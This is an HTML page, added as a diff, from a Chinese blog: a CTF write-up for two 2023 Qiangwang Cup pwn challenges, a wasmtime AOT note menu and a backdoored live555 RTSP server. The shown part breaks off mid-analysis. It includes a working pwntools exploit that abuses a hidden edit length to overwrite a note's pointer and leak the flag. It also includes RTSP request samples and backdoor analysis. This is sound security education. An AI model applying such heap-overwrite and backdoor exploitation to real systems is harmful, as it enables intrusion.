@@ -1,0 +1,568 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.2">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"akaieurus.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="最自闭的一场，详情见2023年度总结 只写了比赛的时候没做出来的，解数比较多的两道">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2023强网杯线上赛pwn wp">
+<meta property="og:url" content="http://akaieurus.github.io/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/index.html">
+<meta property="og:site_name" content="Eurus禁止摆烂！">
+<meta property="og:description" content="最自闭的一场，详情见2023年度总结 只写了比赛的时候没做出来的，解数比较多的两道">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://akaieurus.github.io/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/vmmapwtoa.png">
+<meta property="og:image" content="http://akaieurus.github.io/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/bt1.png">
+<meta property="og:image" content="http://akaieurus.github.io/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/bt2.png">
+<meta property="og:image" content="http://akaieurus.github.io/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/wtoa.png">
+<meta property="og:image" content="http://akaieurus.github.io/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/graph.png">
+<meta property="og:image" content="http://akaieurus.github.io/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/add.png">
+<meta property="og:image" content="http://akaieurus.github.io/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/edit.png">
+<meta property="og:image" content="http://akaieurus.github.io/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/delete.png">
+<meta property="og:image" content="http://akaieurus.github.io/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/show.png">
+<meta property="og:image" content="http://akaieurus.github.io/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/input.png">
+<meta property="og:image" content="http://akaieurus.github.io/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/aaa.png">
+<meta property="og:image" content="http://akaieurus.github.io/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/aa.png">
+<meta property="og:image" content="http://akaieurus.github.io/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/chunk.png">
+<meta property="og:image" content="http://akaieurus.github.io/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/tele.png">
+<meta property="og:image" content="http://akaieurus.github.io/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/checksec.png">
+<meta property="og:image" content="http://akaieurus.github.io/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/handlecmd.png">
+<meta property="og:image" content="http://akaieurus.github.io/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/backdoor1.png">
+<meta property="og:image" content="http://akaieurus.github.io/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/backdoor2.png">
+<meta property="og:image" content="http://akaieurus.github.io/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/backdoor3.png">
+<meta property="og:image" content="http://akaieurus.github.io/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/session.png">
+<meta property="og:image" content="http://akaieurus.github.io/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/client.png">
+<meta property="og:image" content="http://akaieurus.github.io/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/clientconnection.png">
+<meta property="og:image" content="http://akaieurus.github.io/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/clientsession.png">
+<meta property="og:image" content="http://akaieurus.github.io/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/describe.png">
+<meta property="article:published_time" content="2024-01-25T03:40:12.000Z">
+<meta property="article:modified_time" content="2024-01-26T12:38:12.856Z">
+<meta property="article:author" content="Eurus">
+<meta property="article:tag" content="wp">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://akaieurus.github.io/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/vmmapwtoa.png">
+
+<link rel="canonical" href="http://akaieurus.github.io/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>2023强网杯线上赛pwn wp | Eurus禁止摆烂！</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Eurus禁止摆烂！</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">In a world of locked rooms, the man with the key is king.</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://akaieurus.github.io/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="Eurus">
+      <meta itemprop="description" content="本人2022年11月—12月进入了一种原因未知的摆烂状态，故搭建博客来警醒自己。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Eurus禁止摆烂！">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          2023强网杯线上赛pwn wp
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2024-01-25 11:40:12" itemprop="dateCreated datePublished" datetime="2024-01-25T11:40:12+08:00">2024-01-25</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2024-01-26 20:38:12" itemprop="dateModified" datetime="2024-01-26T20:38:12+08:00">2024-01-26</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/wp/" itemprop="url" rel="index"><span itemprop="name">wp</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>最自闭的一场，详情见2023年度总结</p>
+<p>只写了比赛的时候没做出来的，解数比较多的两道</p>
+<span id="more"></span>
+
+<h2 id="wtoa"><a href="#wtoa" class="headerlink" title="wtoa"></a>wtoa</h2><p>wasmtime Ahead-Of-Time（AOT）预编译WASM源码生成的JIT代码</p>
+<p>里面本质还是可执行的机器码，经调试发现大概是wasmtime会调用wtoa里的代码，wtoa又会调用wasmtime的一些接口用于输入输出之类的</p>
+<img src="/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/vmmapwtoa.png" class title="vmmapwtoa">
+
+<img src="/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/bt1.png" class title="bt1">
+
+<img src="/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/bt2.png" class title="bt2">
+
+<h3 id="逆向-amp-调试"><a href="#逆向-amp-调试" class="headerlink" title="逆向 &amp; 调试"></a>逆向 &amp; 调试</h3><p>学到一个新操作，IDA View-&gt;Graphs-&gt;Function Calls能看函数调用图，由于这个题看着像个菜单</p>
+<img src="/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/wtoa.png" class title="wtoa">
+
+<p>这个函数看着像菜单的起点（也确实是），康康</p>
+<img src="/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/graph.png" class title="graph">
+
+<p><em>ps：其实比赛的时候夏爹已经逆到这了，tql！</em></p>
+<p>先看看程序的功能</p>
+<ul>
+<li><p>Add</p>
+<img src="/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/add.png" class title="add">
+</li>
+<li><p>Edit</p>
+<img src="/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/edit.png" class title="edit">
+</li>
+<li><p>Delete</p>
+<img src="/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/delete.png" class title="delete">
+</li>
+<li><p>Show</p>
+<img src="/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/show.png" class title="show"></li>
+</ul>
+<p>浅浅调试一下，<strong>IDA内的地址是gdb的相对地址+0x1000</strong></p>
+<p>这个应该是输入的地方</p>
+<img src="/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/input.png" class title="input">
+
+<ul>
+<li>v5：rbx</li>
+<li>v4：r15</li>
+</ul>
+<p>应该是只取输入的两字节，进行操作的判断，然后就是各个功能对应的函数</p>
+<img src="/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/aaa.png" class title="aaa">
+
+<img src="/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/aa.png" class title="aa">
+
+<p>可以看出我们想要的flag就在下面</p>
+<p>反编译可以看出寻址都是按基址+段内偏移进行的，堆块的管理大概是这样的↓</p>
+<img src="/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/chunk.png" class title="chunk">
+
+<p>edit中有个后门，length为3428913的时候可以将当前堆块的内容扩写为48字节</p>
+<p>当add两个note的时候note1的chunk就在note0的data上面，直接将note1-&gt;buffer指向flag，size改大再show note1就行</p>
+<img src="/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/tele.png" class title="tele">
+
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">data</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Choice &gt; &#x27;</span>,<span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;&gt;&#x27;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(data)).encode())</span><br><span class="line">    p.sendafter(<span class="string">b&#x27; &gt; &#x27;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx,offset,length</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Choice &gt; &#x27;</span>,<span class="string">b&#x27;S&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;index&#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;offset&#x27;</span>,<span class="built_in">str</span>(offset).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;length&#x27;</span>,<span class="built_in">str</span>(length).encode())</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,offset,data,length</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Choice &gt; &#x27;</span>,<span class="string">b&#x27;E&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;index&#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;offset&#x27;</span>,<span class="built_in">str</span>(offset).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;length&#x27;</span>,<span class="built_in">str</span>(length).encode())</span><br><span class="line">    p.sendafter(<span class="string">b&#x27; &gt; &#x27;</span>,data)</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./launch.sh&#x27;</span>)</span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>+p64(<span class="number">0x1300000000</span>)+p64(<span class="number">0x00501cd800501ca0</span>)+p64(<span class="number">0x1b00000000</span>)+p64(<span class="number">0x501b40</span>)+p64(<span class="number">0x100</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0</span>,payload,<span class="number">3428913</span>)</span><br><span class="line">show(<span class="number">1</span>,<span class="number">0</span>,<span class="number">0x50</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="rtsp"><a href="#rtsp" class="headerlink" title="rtsp"></a>rtsp</h2><p>非常好中文路径~~~&#x2F;&#x2F;&#x2F;(^v^)\\\~~~</p>
+<h3 id="基本情况"><a href="#基本情况" class="headerlink" title="基本情况"></a>基本情况</h3><ul>
+<li><p>没开canary</p>
+<img src="/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/checksec.png" class title="checksec">
+</li>
+<li><p>字符串大法好，live555开源库，源码get √</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.rodata:0000000000081CE3	00000018	C	LIVE555 Streaming Media</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>rtsp协议类似http，有各种方法如SETUP，GET_PARAMERTER，PAUSE等，一个报文类似这样👇</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET_PARAMETER rtsp://192.168.111.143:8554/* RTSP/1.0</span><br><span class="line">Session: 3E1B7756</span><br><span class="line">CSeq: 1</span><br><span class="line">GET_INFO: 2023</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="各种后门"><a href="#各种后门" class="headerlink" title="各种后门"></a>各种后门</h3><ul>
+<li><p>有源码所以可以编一个bindiff，猜测会在各个方法的处理函数里进行改动，所以滤一波handleCmd（这个思路挺牛逼的）</p>
+<img src="/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/handlecmd.png" class title="handlecmd">
+</li>
+<li><p>或者字符串中也能看到一些奇怪的字符串</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.rodata:000000000007B39B	0000001C	C	100 maybe you need this %p\n</span><br><span class="line">.rodata:000000000007B3C8	00000022	C	100 you may want to get more flag</span><br><span class="line">.rodata:000000000007B40B	0000000C	C	vul_string:</span><br><span class="line"></span><br><span class="line">.rodata:000000000007B3F9 aQwb            db &#x27;qwb&#x27;,0 </span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>一共三个后门</p>
+<ul>
+<li><p>handleCmd_GET_PARAMETER获取一个程序地址</p>
+<img src="/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/backdoor1.png" class title="backdoor1">
+</li>
+<li><p>handleCmd_SET_PARAMETER可以设置一个标志位</p>
+<img src="/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/backdoor2.png" class title="backdoor2">
+</li>
+<li><p>handleCmd_DESCRIBE设置标志位后存在溢出</p>
+<img src="/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/backdoor3.png" class title="backdoor3"></li>
+</ul>
+<h3 id="调试过程"><a href="#调试过程" class="headerlink" title="调试过程"></a>调试过程</h3><ul>
+<li><p>wavAudioTest相关的操作要先SETUP</p>
+<img src="/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/session.png" class title="session">
+</li>
+<li><p>GET_PARAMETER如果是对wavAudioTest操作实际调用的不是RTSPClientConnection对象的handleCmd_GET_PARAMETER而不是RTSPClientSession对象的</p>
+<img src="/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/client.png" class title="client">
+
+<p>分别调用两个函数的调用栈</p>
+<img src="/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/clientconnection.png" class title="clientconnection">
+
+<img src="/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/clientsession.png" class title="clientsession">
+
+<p>判断在handleRequestBytes函数中</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">     <span class="keyword">if</span> (urlIsRTSPS != fOurRTSPServer.fOurConnectionsUseTLS) &#123;</span><br><span class="line">         </span><br><span class="line">     &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strcmp</span>(cmdName, <span class="string">&quot;OPTIONS&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">  </span><br><span class="line">     &#125; <span class="keyword">else</span> <span class="keyword">if</span> (urlPreSuffix[<span class="number">0</span>] == <span class="string">&#x27;\0&#x27;</span> &amp;&amp; urlSuffix[<span class="number">0</span>] == <span class="string">&#x27;*&#x27;</span> &amp;&amp; urlSuffix[<span class="number">1</span>] == <span class="string">&#x27;\0&#x27;</span>) &#123;</span><br><span class="line"><span class="comment">// The special &quot;*&quot; URL means: an operation on the entire server.  This works only for GET_PARAMETER and SET_PARAMETER:</span></span><br><span class="line">           <span class="keyword">if</span> (<span class="built_in">strcmp</span>(cmdName, <span class="string">&quot;GET_PARAMETER&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">             <span class="built_in">handleCmd_GET_PARAMETER</span>((<span class="type">char</span> <span class="type">const</span>*)fRequestBuffer); <span class="comment">// RTSPClientConnection对象</span></span><br><span class="line">           &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strcmp</span>(cmdName, <span class="string">&quot;SET_PARAMETER&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">             <span class="built_in">handleCmd_SET_PARAMETER</span>((<span class="type">char</span> <span class="type">const</span>*)fRequestBuffer);</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">             <span class="built_in">handleCmd_notSupported</span>();</span><br><span class="line">           &#125;</span><br><span class="line">     &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strcmp</span>(cmdName, <span class="string">&quot;DESCRIBE&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">handleCmd_DESCRIBE</span>(urlPreSuffix, urlSuffix, (<span class="type">char</span> <span class="type">const</span>*)fRequestBuffer);</span><br><span class="line">     &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strcmp</span>(cmdName, <span class="string">&quot;SETUP&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">  </span><br><span class="line">     &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strcmp</span>(cmdName, <span class="string">&quot;TEARDOWN&quot;</span>) == <span class="number">0</span></span><br><span class="line">	 || <span class="built_in">strcmp</span>(cmdName, <span class="string">&quot;PLAY&quot;</span>) == <span class="number">0</span></span><br><span class="line">	 || <span class="built_in">strcmp</span>(cmdName, <span class="string">&quot;PAUSE&quot;</span>) == <span class="number">0</span></span><br><span class="line">	 || <span class="built_in">strcmp</span>(cmdName, <span class="string">&quot;GET_PARAMETER&quot;</span>) == <span class="number">0</span></span><br><span class="line">	 || <span class="built_in">strcmp</span>(cmdName, <span class="string">&quot;SET_PARAMETER&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">           <span class="keyword">if</span> (clientSession != <span class="literal">NULL</span>) &#123;</span><br><span class="line">             clientSession-&gt;<span class="built_in">handleCmd_withinSession</span>(<span class="keyword">this</span>, cmdName, urlPreSuffix, urlSuffix, (<span class="type">char</span> <span class="type">const</span>*)fRequestBuffer); <span class="comment">// RTSPClientSession对象</span></span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">             <span class="built_in">handleCmd_sessionNotFound</span>();</span><br><span class="line">           &#125;</span><br><span class="line">     &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strcmp</span>(cmdName, <span class="string">&quot;REGISTER&quot;</span>) == <span class="number">0</span> || <span class="built_in">strcmp</span>(cmdName, <span class="string">&quot;DEREGISTER&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">  </span><br><span class="line">     &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  </span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>DESCRIBE方法只能对wavAudioTest操作</p>
